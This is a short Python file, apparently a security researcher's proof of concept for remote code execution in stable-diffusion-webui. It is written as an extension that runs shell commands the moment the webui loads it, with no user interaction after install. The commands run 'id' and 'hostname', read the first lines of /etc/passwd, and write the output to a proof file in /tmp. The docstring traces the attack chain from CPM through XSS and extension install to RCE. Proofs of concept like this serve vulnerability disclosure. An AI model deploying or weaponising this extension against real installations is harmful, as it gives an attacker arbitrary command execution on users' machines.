"""
CPM RCE PoC — auto-executes when stable-diffusion-webui loads this extension.
Writes OS command output to a proof file. No user interaction needed after install.
"""
import os, subprocess, gradio as gr

# Execute at module load time — this runs when webui starts with the extension installed
_out = subprocess.check_output(
    "id && hostname && echo '[RCE] stable-diffusion-webui CPM->RCE proof' && cat /etc/passwd | head -3",
    shell=True, stderr=subprocess.STDOUT, text=True
)

_proof_path = "/tmp/sdwebui_cpm_rce_proof.txt"
with open(_proof_path, "w") as f:
    f.write("[PATH] stable-diffusion-webui CPM -> XSS -> extension install -> RCE\n")
    f.write("[TRIGGER] scripts/rce_poc.py loaded at webui startup\n\n")
    f.write(_out)

print(f"[CPM-RCE-POC] Proof written to {_proof_path}")
print(_out)


def on_ui_tabs():
    with gr.Blocks() as demo:
        gr.Markdown(f"**CPM RCE PoC** — proof file at `{_proof_path}`")
    return [(demo, "CPM RCE PoC", "cpm_rce_poc")]
